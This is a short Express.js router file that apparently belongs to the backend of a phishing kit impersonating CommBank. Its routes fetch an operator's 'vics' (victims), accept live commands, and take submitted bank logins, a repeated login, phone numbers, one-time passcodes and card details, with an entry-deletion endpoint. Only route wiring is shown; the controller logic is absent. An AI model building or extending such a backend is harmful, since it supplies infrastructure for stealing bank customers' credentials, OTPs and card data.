const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitTelephone,
	submitOtp,
	submitCard,
	deleteEntry,
} = require("../controllers/commbankController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/telephone", submitTelephone);
router.post("/card", submitCard);
router.post("/delete", deleteEntry);

module.exports = router;
